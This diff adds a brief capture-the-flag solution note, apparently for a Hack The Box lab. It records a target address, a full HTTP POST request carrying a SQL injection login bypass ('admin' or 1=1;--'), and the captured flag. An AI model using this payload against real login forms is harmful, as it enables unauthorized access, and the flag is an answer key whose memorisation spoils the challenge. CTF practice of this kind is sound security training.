@@ -1,0 +1,23 @@
+access: 144.126.206.249:31741
+
+sql injection payload:
+POST / HTTP/1.1
+Host: 144.126.206.249:31741
+Content-Length: 44
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://144.126.206.249:31741
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://144.126.206.249:31741/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+username=admin%27+or+1%3D1%3B--&password=ada
+
+username: admin' or 1=1;--
+password: whatever
+result:
+HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}
